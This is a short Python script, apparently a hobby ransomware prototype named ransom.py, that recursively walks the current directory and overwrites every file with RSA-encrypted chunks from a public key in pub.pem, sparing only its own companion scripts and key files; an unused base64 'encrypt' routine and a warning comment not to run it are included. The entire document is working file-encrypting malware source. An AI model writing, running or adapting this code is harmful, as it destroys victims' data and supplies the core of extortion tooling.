import os, base64
root_dir = os.getcwd()
from Crypto.PublicKey import RSA


### DON'T RUN THIS PROGRAM UNLESS YOU WANT TO ENCRYPT THE FILES IN THIS DIR AND SUBDIRS ###

def encrypt2(dir, filen, public_rsa):
        if filen != "ransom.py" and filen !="ransom_undo.py" and filen != "ransom_check.py"  and filen != "priv.pem" and filen != "pub.pem":
                file = open(dir + "/" + filen)
                contents = file.read()
                file.close()
                file = open( dir + "/" + filen, "w")
		#contents = public_rsa.encrypt(contents,256)
                to_join = []
		step = 0
		while 1:
			s = contents[step*128:(step+1)*128]
			if not s: break
			
			to_join.append(public_rsa.encrypt(s, 128)[0])
			step += 1
		
		contents = '\r\r\r'.join(to_join)
		file.write( contents )
	


### base 64 encrypts file contents ###
def encrypt(dir, filen):
	if filen != "ransom.py" and filen !="ransom_undo.py" and filen != "ransom_check.py":
		file = open(dir + "/" + filen)
		contents = file.read()
		file.close()
		file = open( dir + "/" + filen, "w")
		file.write( base64.b64encode(contents) )
		file.close()
		print("File encrypted: " + dir + "/" + filen)


public_rsa = RSA.importKey(open("pub.pem", "r"))

### encrypting all files  ###
for subdir, dirs, files in os.walk(root_dir):
	for file in files:
		encrypt2(subdir, file, public_rsa)
